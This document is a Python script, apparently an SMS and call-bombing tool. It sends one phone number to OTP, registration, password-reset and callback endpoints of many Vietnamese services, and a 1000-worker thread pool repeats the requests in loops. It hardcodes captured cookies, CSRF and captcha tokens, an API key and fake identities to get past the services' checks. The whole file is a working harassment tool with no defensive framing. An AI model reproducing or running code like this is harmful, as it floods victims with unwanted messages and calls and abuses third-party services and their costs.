import requests
import json
import time
from concurrent.futures import ThreadPoolExecutor
threading = ThreadPoolExecutor(max_workers=int(1000))  
class api_sms():
  def vnsc(phone):
    headers = {
      "Host": "invest.vnsc.vn",
      "content-length": "65",
      "accept": "application/json, text/plain, */*",
      "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36",
      "content-type": "application/json",
      "origin": "https://invest.vnsc.vn",
      "x-requested-with": "mark.via.gp",
      "sec-fetch-site": "same-origin",
      "sec-fetch-mode": "cors",
      "sec-fetch-dest": "empty",
      "referer": "https://invest.vnsc.vn/register?utm_source=Button_DangKy&utm_medium=HomeVNSC",
      "accept-encoding": "gzip, deflate, br",
      "accept-language": "vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7"
      }
    data = {"type":"PHONE_VERIFICATION_OTP","phone":phone,"email":""}
    data_string = json.dumps(data)
    url = "https://invest.vnsc.vn/api/user/auth/v1/otp"
    a = requests.post(url, data=data_string, headers=headers)
  
  def gapowork(phone):
    headers ={"Host": "api.gapowork.vn","content-length": "29","accept": "application/json, text/plain, */*","x-gapo-lang": "vi","user-agent": "Mozilla/5.0 (Linux; Android 13; 2201117TG Build/TKQ1.221114.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36","content-type": "application/json","origin": "https://www.gapowork.vn","x-requested-with": "mark.via.gp","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://www.gapowork.vn/","accept-encoding": "gzip, deflate, br","accept-language": "vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7"
      }
    url = "https://api.gapowork.vn/auth/v3.1/check-phone-number"
    data = {"phone_number":phone}
    requests.post(url,headers=headers,data=json.dumps(data)).text
    requests.options("https://api.gapowork.vn/auth/v3.1/signup").text
    requests.post("https://api.gapowork.vn/auth/v3.1/signup",headers=headers,data=json.dumps({"phone_number":phone,"device_id":"e5615832-c3ca-416e-950a-d601f4ac99ba","device_model":"web"})).text
  
  def vayvnd(sdt):
    data = '{"phone":"sdt","utm":[{"utm_source":"google","utm_medium":"organic","referrer":"https://www.google.com/"}],"sourceSite":3}'.replace("sdt",sdt)
    head = {
    "Host":"api.vayvnd.vn",
    "accept":"application/json",
    "accept-language":"vi-VN",
    "user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36",
    "site-id":"3",
    "content-type":"application/json; charset=utf-8",
    "origin":"https://vayvnd.vn",
    "x-requested-with":"mark.via.gp",
    "sec-fetch-site":"same-site",
    "sec-fetch-mode":"cors",
    "sec-fetch-dest":"empty",
    "referer":"https://vayvnd.vn/",
    "accept-encoding":"gzip, deflate, br",
      }
    rq = requests.post("https://api.vayvnd.vn/v2/users",data=data,headers=head).json()
    requests.options("https://api.vayvnd.vn/v2/users/password-reset")
    rq= requests.post("https://api.vayvnd.vn/v2/users/password-reset",data=json.dumps({"login":sdt}),headers=head).json()
  
  def vuihoc(phone):
    header = {
      "Host": "vuihoc.vn",
      "content-length": "17",
      "accept": "application/json, text/javascript, */*; q=0.01",
      "x-requested-with": "XMLHttpRequest",
      "user-agent": "Mozilla/5.0 (Linux; Android 13; 2201117TG Build/TKQ1.221114.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
      "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
      "origin": "https://vuihoc.vn",
      "sec-fetch-site": "same-origin",
      "sec-fetch-mode": "cors",
      "sec-fetch-dest": "empty",
      "referer": "https://vuihoc.vn/user/verifyAccountkitSMS?phone=+84334304657&typeOTP=1",
      "accept-encoding": "gzip, deflate, br",
      "accept-language": "vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7",
      "cookie": "VERSION=1;WEB_LOP=1"
    }
    requests.post("https://vuihoc.vn/service/security/sendOTPSMS",headers=header,data={"mobile":phone}).text
  
  def fptshop(phone):
    rq = requests.post("https://fptshop.com.vn/api-data/loyalty/Home/Verification", headers={"Host": "fptshop.com.vn","content-length": "16","accept": "*/*","content-type": "application/x-www-form-urlencoded; charset\u003dUTF-8","x-requested-with": "XMLHttpRequest","sec-ch-ua-mobile": "?1","user-agent": "Mozilla/5.0 (Linux; Android 8.1.0; CPH1805) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform": "\"Linux\"","origin": "https://fptshop.com.vn","sec-fetch-site": "same-origin","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://fptshop.com.vn/","accept-encoding": "gzip, deflate, br"}, data={"phone":phone}).text
  
  def vieon(phone):
    data = f'phone_number={phone}&password=1262007Gdtg&given_name=&device_id=688e6ab3da160a362df3805047548504&platform=mobile_web&model=Android%208.1.0&push_token=&device_name=Chrome%2F114&device_type=desktop&isMorePlatform=true&ui=012021'
    head = {
      "Host":"api.vieon.vn",
      "accept":"application/json, text/plain, */*",
      "user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36",
      "content-type":"application/x-www-form-urlencoded",
      "x-requested-with":"mark.via.gp",
      "sec-fetch-site":"same-site",
      "sec-fetch-mode":"cors",
      "sec-fetch-dest":"empty",
      "referer":"https://vieon.vn/",
      "accept-encoding":"gzip, deflate, br",
    }
    rq = requests.post("https://api.vieon.vn/backend/user/register/mobile?platform=mobile_web&ui=012021",data=data,headers=head).json()
  
  def tv360(phone):
    head = {
      "Host":"m.tv360.vn",
      "accept":"application/json, text/plain, */*",
      "user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36",
      "content-type":"application/json",
      }
    data = '{"msisdn":"sdt"}'
    data = data.replace("sdt",phone)
    rq = requests.post("https://m.tv360.vn/public/v1/auth/get-otp-login",data=data,headers=head).json()
  
  def fptplay(phone):
    headers = {
      "Host": "api.fptplay.net",
      "content-length": "89",
      "sec-ch-ua": "\"Chromium\";v\u003d\"112\", \"Google Chrome\";v\u003d\"112\", \"Not:A-Brand\";v\u003d\"99\"",
      "accept": "application/json, text/plain, */*",
      "content-type": "application/json; charset=UTF-8",
      "sec-ch-ua-mobile": "?1",
      "user-agent": "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
      "sec-ch-ua-platform": '"Android"',
      "origin": "https://fptplay.vn",
      "sec-fetch-site": "cross-site",
      "x-did":"0696D82D24F52BE5",
      "sec-fetch-mode": "cors",
      "sec-fetch-dest": "empty",
      "referer": "https://fptplay.vn/",
      "accept-encoding": "gzip, deflate, br",
      "accept-language": "vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7"}
    datason = json.dumps({"phone": phone,"country_code":"VN","client_id":"vKyPNd1iWHodQVknxcvZoWz74295wnk8"})
    rq = requests.post("https://api.fptplay.net/api/v7.1_w/user/otp/register_otp?st=M6apbZ0_aq3JKaHYKa_P0g&e=1695310173&device=Chrome(version%253A116.0.0.0)&drm=1", data=datason, headers=headers).json()
  
  def f88(phone):
    head = {
        "Host": "api.f88.vn",
        "accept": "application/json, text/plain, */*",
        "content-encoding": "gzip",
        "user-agent": "Mozilla/5.0 (Linux; Android 12; Pixel 3 Build/SP1A.210812.016.C1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.5195.136 Mobile Safari/537.36",
        "content-type": "application/json",
        "origin": "https://online.f88.vn",
        "referer": "https://online.f88.vn/"
    }
    data = {"phoneNumber":phone,"recaptchaResponse":"03AFY_a8WJNsx5MK3zLtXhUWB0Jlnw7pcWRzw8R3OhpEx5hu3Shb7ZMIfYg0H2X24378jj2NFtndyzGFF_xjjZ6bbq3obns9JlajYsIz3c1SESCbo05CtzmP_qgawAgOh495zOgNV2LKr0ivV_tnRpikGKZoMlcR5_3bks0HJ4X_R6KgdcpYYFG8cUZRSxSamyRPkC2yjoFNpTeCJ2Q6-0uDTSEBjYU5T3kj8oM8rAAR6BnBVVD7GMz0Ol2OjsmmXO4PtOwR8yipYdwBnL2p8rC8cwbPJ-Q6P1mTmzHkxZwZWcKovlpEGUvt2LfByYwXDMmx7aoI6QMTitY64dDVDdQSWQfyXC1jFg200o5TBFnTY0_0Yik31Y33zCM_r24HQ56KRMuew2LazF8u_30vyWN1tigdvPddOOPjWGjh2cl87l2cF57lCvoRTtOm-RRxyy5l0eq4dgsu2oy1khwawzzP5aE9c2rgcdDVMojZOUpamqhbKtsExad31Brilwf7BSVvu-JT33HtHO","source":"Online"}
    rq = requests.post("https://api.f88.vn/growth/appvay/api/onlinelending/VerifyOTP/sendOTP", headers=head, data=json.dumps(data))
  
  def thitruongsi(phone):
    headers = {
        "Host": "api.thitruongsi.com",
        "content-length": "641",
        "accept": "application/json, text/plain, */*",
        "content-type": "application/json",
        "sec-ch-ua-mobile": "?1",
        "user-agent": "Mozilla/5.0 (Linux; Android 10; RMX1919) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Mobile Safari/537.36",
        "sec-ch-ua-platform": "\"Android\"",
        "origin": "https://m.thitruongsi.com",
        "sec-fetch-site": "same-site",
        "sec-fetch-mode": "cors",
        "sec-fetch-dest": "empty",
        "referer": "https://m.thitruongsi.com/",
        "accept-encoding": "gzip, deflate, br",
        "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,ru;q=0.4"
    }
    
    data = {
        "account_phone": phone
    }
    rq = requests.post("https://api.thitruongsi.com/v1/user/api/v4/users/register/step1-phone", headers=headers, data=json.dumps(data))
  
  def icankid(phone):
    headers = {
      "Host": "id.icankid.vn",
      "Connection": "keep-alive",
      "Content-Length": "134",
      "User-Agent": "Mozilla/5.0 (Linux; Android 13; 2201117TG Build/TKQ1.221114.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
      "content-type": "application/json",
      "Accept": "*/*",
      "Origin": "https://id.icankid.vn",
      "X-Requested-With": "mark.via.gp",
      "Sec-Fetch-Site": "same-origin",
      "Sec-Fetch-Mode": "cors",
      "Sec-Fetch-Dest": "empty",
      "Referer": "https://id.icankid.vn/auth",
      "Accept-Encoding": "gzip, deflate, br",
      "Accept-Language": "vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7",
      "Cookie": "_hjSessionUser_3154488=eyJpZCI6IjRkNjRiMDU4LWQ1YzUtNTM5YS1hZTU0LWFiNThlODhhYThjOSIsImNyZWF0ZWQiOjE2OTUzODI0MzA4MzAsImV4aXN0aW5nIjpmYWxzZX0=; _hjFirstSeen=1; _hjIncludedInSessionSample_3154488=0; _hjSession_3154488=eyJpZCI6IjZiMjBkNzAyLWNlY2QtNDE4My1hMzM5LTlkNzU3ODIyNzRkNyIsImNyZWF0ZWQiOjE2OTUzODI0MzA4MzYsImluU2FtcGxlIjpmYWxzZX0=; _hjAbsoluteSessionInProgress=0; _fbp=fb.1.1695382431044.1546964926"
    }

    data = {
        "phone": phone,
        "challenge_code": "793741a348d2332990fdebb324e34262a4357b9e2dc126bef98667b6e0c9f0df",
        "challenge_method": "SHA256"
    }

    datajson = json.dumps(data)
    
    rq = requests.post("https://id.icankid.vn/api/otp/challenge/", headers=headers, data=datajson)
    
  def vamo(phone):
    headers = {
      "Host": "vamo.vn",
      "content-length": "24",
      "accept": "application/json, text/plain, */*",
      "user-agent": "Mozilla/5.0 (Linux; Android 13; 2201117TG Build/TKQ1.221114.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
      "content-type": "application/json",
      "origin": "https://vamo.vn",
      "x-requested-with": "mark.via.gp",
      "sec-fetch-site": "same-origin",
      "sec-fetch-mode": "cors",
      "sec-fetch-dest": "empty",
      "referer": "https://vamo.vn/app/login",
      "accept-encoding": "gzip, deflate, br",
      "accept-language": "vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7",
      "cookie": "pll_language=vi"
    }
    data = {"username":phone[1:11]}
    rq = requests.post("https://vamo.vn/ws/api/public/login-with-otp/generate-otp", headers=headers, data=json.dumps(data))
    data = {"phoneNumber":phone[1:11],"codePurpose":"AUTHORIZATION"}
    rq = requests.post("https://vamo.vn/ws/api/public/login-with-otp/call/is-available", headers=headers, data=json.dumps(data))
    
  def utop(phone):
    headers = {
      "Host": "api.utopapp.net",
      "content-length": "30",
      "content-type": "application/json",
      "accept": "application/json, text/plain, */*",
      "api-version": "v2",
      "user-agent": "Mozilla/5.0 (Linux; Android 13; 2201117TG Build/TKQ1.221114.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
      "ocp-apim-trace": "true",
      "ocp-apim-subscription-key": "0797329a34b2465f951e73ddf6627e8e",
      "origin": "https://id.utop.vn",
      "x-requested-with": "mark.via.gp",
      "sec-fetch-site": "cross-site",
      "sec-fetch-mode": "cors",
      "sec-fetch-dest": "empty",
      "referer": "https://id.utop.vn/",
      "accept-encoding": "gzip, deflate, br",
      "accept-language": "vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7"
    }
    data={"phoneNumber":"+84"+phone[1:11]}
    rq=requests.post("https://api.utopapp.net/partner/otp/RequestOTP",headers=headers,data=json.dumps(data))
    
  def sapo(phone):
    headers = {
      "Host": "www.sapo.vn",
      "content-length":"22",
      "user-agent": "Mozilla/5.0 (Linux; Android 13; 2201117TG Build/TKQ1.221114.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
      "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
      "accept": "*/*",
      "origin": "https://www.sapo.vn",
      "x-requested-with": "mark.via.gp",
      "sec-fetch-site": "same-origin",
      "sec-fetch-mode": "cors",
      "sec-fetch-dest": "empty",
      "referer": "https://www.sapo.vn/",
      "accept-encoding": "gzip, deflate, br",
      "accept-language": "vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7"

    }
    data = "phonenumber="+phone
    rq=requests.post("https://www.sapo.vn/fnb/sendotp",headers=headers,data=data)
    
  def tima(phone):
    headers={
      "Host": "tima.vn",
      "content-length": "16",
      "accept": "*/*",
      "x-requested-with": "XMLHttpRequest",
      "user-agent": "Mozilla/5.0 (Linux; Android 13; 2201117TG Build/TKQ1.221114.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36",
      "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
      "origin": "https://tima.vn",
      "sec-fetch-site": "same-origin",
      "sec-fetch-mode": "cors",
      "sec-fetch-dest": "empty",
      "referer": "https://tima.vn/nha-dau-tu",
      "accept-encoding": "gzip, deflate, br",
      "accept-language": "vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7"
    }
    data=f"phone={phone}"
    rq=requests.post("https://tima.vn/Lender/SendOtp",headers=headers,data=data)
    
  def hasaki(phone):
    requests.get(f"https://hasaki.vn/ajax?api=user.verifyUserName&username={phone}")
    
  def Winmart(phone):
    headers ={
      "Accept": "application/json, text/plain, */*",
      "Accept-Encoding": "gzip",
      "Accept-Language": "vi-VN",
      "Sec-Ch-Ua": '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
      "Sec-Ch-Ua-Mobile": "?0",
      "Sec-Ch-Ua-Platform": '"Windows"',
      "Sec-Fetch-Dest":"empty",
      "Sec-Fetch-Mode":"cors",
      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
    }
    requests.options(f"https://api-crownx.winmart.vn/cs/api/winlife/check-profile?phoneNo={phone}&identifyCardId=undefined",headers=headers).text
    requests.get(f"https://api-crownx.winmart.vn/cs/api/winlife/check-profile?phoneNo={phone}&identifyCardId=undefined",headers=headers).text
    requests.options(f"https://api-crownx.winmart.vn/as/api/web/v1/send-otp?phoneNo={phone}",headers=headers).text
    check=requests.get(f"https://api-crownx.winmart.vn/as/api/web/v1/send-otp?phoneNo={phone}",headers=headers).text
    
  def Mocha(phone):
    headers ={
      "Accept": "application/json, text/plain, */*",
      "Accept-Encoding": "gzip",
      "Accept-Language": "vi-VN",
      "Sec-Ch-Ua": '"Not.A/Brand";v="8", "Chromium";v="114", "Google Chrome";v="114"',
      "Sec-Ch-Ua-Mobile": "?0",
      "Sec-Ch-Ua-Platform": '"Windows"',
      "Sec-Fetch-Dest":"empty",
      "Sec-Fetch-Mode":"cors",
      "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36"
    }
    headers.update({"Connection": "keep-alive","Host":"apivideo.mocha.com.vn","Origin":"https://video.mocha.com.vn","Referer":"https://video.mocha.com.vn/","Content-Length":"0"})
    textmocha = requests.post(f"https://apivideo.mocha.com.vn/onMediaBackendBiz/mochavideo/getOtp?msisdn={phone}&languageCode=vi", headers=headers).text
class api_call():
  def robocash(phone):
    headers= {
    "Host": "robocash.vn",
    "upgrade-insecure-requests": "1",
    "user-agent": "Mozilla/5.0 (Linux; Android 13; 2201117TG Build/TKQ1.221114.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "dnt": "1",
    "x-requested-with": "mark.via.gp",
    "sec-fetch-site": "none",
    "sec-fetch-mode": "navigate",
    "sec-fetch-user": "?1",
    "sec-fetch-dest": "document",
    "accept-encoding": "gzip, deflate, br",
    "accept-language": "vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7",
    "cookie":"__cfruid=74de1e14f2be743a4cd25f185dbf347412ce447a-1694702586;_fbp=fb.1.1694702595272.1742451503;ec_png_utm=7bc316a5-71f0-6613-4a78-2bf8cd8d2f19;ec_png_client=false;ec_png_client_utm=null;ec_etag_utm=7bc316a5-71f0-6613-4a78-2bf8cd8d2f19;ec_cache_utm=7bc316a5-71f0-6613-4a78-2bf8cd8d2f19;ec_etag_client=false;ec_cache_client=false;ec_cache_client_utm=null;ec_etag_client_utm=null;uid=7bc316a5-71f0-6613-4a78-2bf8cd8d2f19;client=false;client_utm=null;supportOnlineTalkID=HOE6e2oyMLWaLLXiWyI9mh6vT56f5SdE;XSRF-TOKEN=eyJpdiI6IktQZEZXeGJHbFNqcGdXZkFTMUZ4NlE9PSIsInZhbHVlIjoiOTNrZFFTdlF4VzZiOHJHTERQZVFIUjliV1RjVTBaSnVMTU9PRnNXM1ZZR0xnZ0ZmVUE5bVZrTmYvUlBwNzlnQ3ZFd2xFeTZNckoyK1k4OFVTWXNhdVJLZE85NXUvZldYK0hqZVJ5aStTMCttQnBSOVcyK3cxSzJuV3NidllLdFgiLCJtYWMiOiI4ZDZkYzFkM2VlNjNhYmRmM2JjMzFhZGMxNDQyMWYxODE4ZGE0OTUyYjM2OGFiZTJjNzY2MDIyZjcwNDk3OTQ2IiwidGFnIjoiIn0%3D;sessionid=eyJpdiI6ImpiVFpDM25UVXFZOFBva3BnY3RmclE9PSIsInZhbHVlIjoidEdrZmM0KzNlaEFycGFsVXE3cVQzZ2NJNnpMTkYxT3NqSFROVnpmK3F0TkVhbXQxSFR5RGEybGJuUWhLclJnSDF3Zldkd050M08xTGNFR3o5cTcvNkxXSWxMdHVhWElJeW4zRHBkVHdMREdtZGdRVHdYTEtpOTVLUjZTWUF1bHAiLCJtYWMiOiJmOWVjM2I5NDU2Y2ZjMzg4NTM0ZTY4ZDhlZDczNDFjZmU2ODFkMTRmZjcxODZiNTAxZTM2NDg2YWU1MWNhYjk3IiwidGFnIjoiIn0%3D;utm_uid=eyJpdiI6IkJWZGZ3anZCVG9wV3dlSXlDc3NIbmc9PSIsInZhbHVlIjoibXMyRzRZUHpUUU9lYnFjME41UFAxS2R3VDQxd2p4dDlzd3pvcDlROTBnSlUzcG1BcW5Jdm1GS1VUS3dWNWcwYk93UEFGdHM3eDYyWmZFU2RlRE1zaVRjMW5WSjN1bHgzS0NkS0R2dGhib3kra3lBUkFlRUp1TUZNWGFUcDcxclQiLCJtYWMiOiJmZTdlYjU0OGVmOGZlYTc4OGIwODY5OWFmYmU0NTJmZGZlYmNiZWJhOTFmZTI2OTk2MjA3MzRhYTY0ZDY0N2VhIiwidGFnIjoiIn0%3D"
    }
    requests.get(f"https://robocash.vn/register/phone-change?another_phone={phone}",headers=headers).text
  
  def dongplus(phone):
    headers = {
      "Host": "api.dongplus.vn",
      "content-length": "30",
      "accept-language": "vi",
      "user-agent": "Mozilla/5.0 (Linux; Android 13; 2201117TG Build/TKQ1.221114.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
      "content-type": "application/json",
      "accept": "*/*",
      "origin": "https://dongplus.vn",
      "x-requested-with": "mark.via.gp",
      "sec-fetch-site": "same-site",
      "sec-fetch-mode": "cors",
      "sec-fetch-dest": "empty",
      "referer": "https://dongplus.vn/user/registration/reg1",
      "accept-encoding": "gzip, deflate, br"
    }
    data = json.dumps({"mobile_phone":f"84{phone[1:11]}"})
    rq=requests.options("https://api.dongplus.vn/api/v2/user/check-phone")
    rq=requests.post("https://api.dongplus.vn/api/v2/user/check-phone",headers=headers,data=data)
    data = json.dumps({"full_name":"Tran Minh Anh","first_name":"Anh","last_name":"Tran","middle_name":"Minh","mobile_phone":f"84{phone[1:11]}","target_url":"https://dongplus.vn/?utm_source=google&utm_medium=organic&utm_campaign=organic"})
    rq=requests.post("https://api.dongplus.vn/api/user",headers=headers,data=data)
    
  def senmo(phone):
    headers = {
      "Host": "api.senmo.vn",
      "content-length": "23",
      "accept-language": "vi",
      "user-agent": "Mozilla/5.0 (Linux; Android 13; 2201117TG Build/TKQ1.221114.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
      "content-type": "application/json",
      "accept": "*/*",
      "origin": "https://senmo.vn",
      "x-requested-with": "mark.via.gp",
      "sec-fetch-site": "same-site",
      "sec-fetch-mode": "cors",
      "sec-fetch-dest": "empty",
      "referer": "https://senmo.vn/user/login",
      "accept-encoding": "gzip, deflate, br",
      "cookie": "_fw_crm_v=e3aa67fa-590e-44d9-9bcc-da335b0f5e35"
    }
    rq=requests.post("https://api.senmo.vn/api/user/send-one-time-password", headers=headers, data=json.dumps({"phone":"84"+phone[1:11]}))
  
  def thantaioi(phone):
    headers = {
      "Host": "api.thantaioi.vn",
      "content-length": "23",
      "accept-language": "vi",
      "user-agent": "Mozilla/5.0 (Linux; Android 13; 2201117TG Build/TKQ1.221114.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
      "content-type": "application/json",
      "accept": "*/*",
      "origin": "https://thantaioi.vn",
      "x-requested-with": "mark.via.gp",
      "sec-fetch-site": "same-site",
      "sec-fetch-mode": "cors",
      "sec-fetch-dest": "empty",
      "referer": "https://thantaioi.vn/user/login",
      "accept-encoding": "gzip, deflate, br",
      "cookie": "_fw_crm_v=f778754e-f720-4d4c-db46-c97df88ed8f3"
      }
    rq=requests.post("https://api.thantaioi.vn/api/user/send-one-time-password", headers=headers, data=json.dumps({"phone":"84"+phone[1:11]}))
  
  def oncredit(phone):
    headers={
      "Host": "oncredit.vn",
      "content-length": "159",
      "accept": "application/json, text/javascript, */*; q=0.01",
      "x-requested-with": "XMLHttpRequest",
      "user-agent": "Mozilla/5.0 (Linux; Android 13; 2201117TG Build/TKQ1.221114.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36",
      "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
      "origin": "https://oncredit.vn",
      "sec-fetch-site": "same-origin",
      "sec-fetch-mode": "cors",
      "sec-fetch-dest": "empty",
      "referer": "https://oncredit.vn/registration",
      "accept-encoding": "gzip, deflate, br",
      "accept-language": "vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7",
      "cookie":"SN5c8116d5e6183=r6cpgiql5u2sfchhqd1j9ddbh0;OnCredit_id=650af5ad08c602.16048383;GN_USER_ID_KEY=01f28cc4-e152-4611-9b04-4244f462f38e;fp_token_7c6a6574-f011-4c9a-abdd-9894a102ccef=zcNk0NcdtnqUodc4KR7aq+y5xiOad7cVgGOAh48MkUE=;OnCredit=84334304657;ouid=5736ab47-206f-43c4-a6b3-2abf1b96a7c9;oula=0;oulr=0;ouao=0;ouar=0;GN_SESSION_ID_KEY=e35a2d44-07d5-4ae2-ad29-2138dcfc2620"
    }
    data=f"data%5BtypeData%5D=checkUserLogin&data%5Bphone%5D={phone}&CSRFName=CSRFGuard_ajax&CSRFToken=YndGYaFKRrezfhkRbdrEE2s2r53aYKSRaQSfHRFDkYk9yhNNAkiTGBFBnfTk2HEz"
    rq=requests.post("https://oncredit.vn/?ajax",headers=headers,data=data)


class api_advise():
  def giaohangtietkiem(phone):
    headers = {
      "Host":"web.giaohangtietkiem.vn",
      "content-length": "20",
      "apptype": "Web",
      "uniqdevice": "54fed250-6f89-47d8-9646-7b991e28a943",
      "authorization": "Bearer null",
      "user-agent": "Mozilla/5.0 (Linux; Android 13; 2201117TG Build/TKQ1.221114.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
      "shop-code": "",
      "content-type": "application/json",
      "accept": "*/*",
      "origin": "https://khachhang.giaohangtietkiem.vn",
      "x-requested-with": "mark.via.gp",
      "sec-fetch-site": "same-site",
      "sec-fetch-mode": "cors",
      "sec-fetch-dest": "empty",
      "referer": "https://khachhang.giaohangtietkiem.vn/",
      "accept-encoding": "gzip, deflate, br",
      "accept-language": "vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7"
    }
    data = {"tel":phone}
    rq = requests.post("https://web.giaohangtietkiem.vn/api/v1/register-shop/support-tel/add",headers=headers,data=json.dumps(data))
  def ldpform(phone):
    headers = {
      "Host": "api.ldpform.com",
      "content-length": "1007",
      "user-agent": "Mozilla/5.0 (Linux; Android 13; 2201117TG Build/TKQ1.221114.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
      "content-type": "application/json",
      "accept": "*/*",
      "origin": "https://lwcare.livwell.asia",
      "x-requested-with": "mark.via.gp",
      "sec-fetch-site": "cross-site",
      "sec-fetch-mode": "cors",
      "sec-fetch-dest": "empty",
      "referer": "https://lwcare.livwell.asia/",
      "accept-encoding": "gzip, deflate, br",
      "accept-language": "vi-VN,vi;q=0.9,en-US;q=0.8,en;q=0.7"
    }
    data = {"form_config_id":"63eb6c626a4a9b001206c9c2","ladi_form_id":"supportinfoform","ladipage_id":"6459ae861de9260050abc2b5","tracking_form":[{"name":"url_page","value":"https://lwcare.livwell.asia/"},{"name":"utm_source","value":""},{"name":"utm_medium","value":""},{"name":"utm_campaign","value":""},{"name":"utm_term","value":""},{"name":"utm_content","value":""},{"name":"variant_url","value":""},{"name":"variant_content","value":""}],"form_data":[{"name":"name","value":"Nguyen Hoang Anh"},{"name":"email","value":"abcxyz@gmail.com"},{"name":"phone","value":phone},{"name":"message","value":"Hãy Liên Hệ Sớm Cho Tôi Nhé"},{"name":"ward","value":"180:Xã Lạc Quới"},{"name":"district","value":"1751:Huyện Tri Tôn"},{"name":"state","value":"217:An Giang"},{"name":"country","value":"VN:Việt Nam"},{"name":"form_item159","value":"Tư vấn & Nhận báo giá gói lợi ích Sức khỏe LivWell One cho doanh nghiệp"}],"data_key":"null","status_send":"2","total_revenue":"0","time_zone":"7"}
    rq=requests.post("https://api.ldpform.com/sendform", headers=headers,data=json.dumps(data))

def sms(phone,stt_while):
  for i in range(stt_while):
    threading.submit(api_sms.vnsc,phone)
    threading.submit(api_sms.gapowork,phone)
    threading.submit(api_sms.vayvnd,phone)
    threading.submit(api_sms.vuihoc,phone)
    threading.submit(api_sms.fptshop,phone)
    threading.submit(api_sms.vieon,phone)
    threading.submit(api_sms.tv360,phone)
    #threading.submit(api_sms.fptplay,phone)
    threading.submit(api_sms.f88,phone)
    threading.submit(api_sms.thitruongsi,phone)
    threading.submit(api_sms.icankid,phone)
    threading.submit(api_sms.vamo,phone)
    threading.submit(api_sms.utop,phone)
    threading.submit(api_sms.sapo,phone)
    threading.submit(api_sms.tima,phone)
    threading.submit(api_sms.hasaki,phone)
    threading.submit(api_sms.Winmart,phone)
    threading.submit(api_sms.Mocha,phone)
    time.sleep(30)
def now_sms(phone):
  threading.submit(api_sms.vnsc,phone)
  threading.submit(api_sms.gapowork,phone)
  threading.submit(api_sms.vayvnd,phone)
  threading.submit(api_sms.vuihoc,phone)
  threading.submit(api_sms.fptshop,phone)
  threading.submit(api_sms.vieon,phone)
  threading.submit(api_sms.tv360,phone)
  #threading.submit(api_sms.fptplay,phone)
  threading.submit(api_sms.f88,phone)
  threading.submit(api_sms.thitruongsi,phone)
  threading.submit(api_sms.icankid,phone)
  threading.submit(api_sms.vamo,phone)
  threading.submit(api_sms.utop,phone)
  threading.submit(api_sms.sapo,phone)
  threading.submit(api_sms.tima,phone)
  threading.submit(api_sms.hasaki,phone)
  threading.submit(api_sms.Winmart,phone)
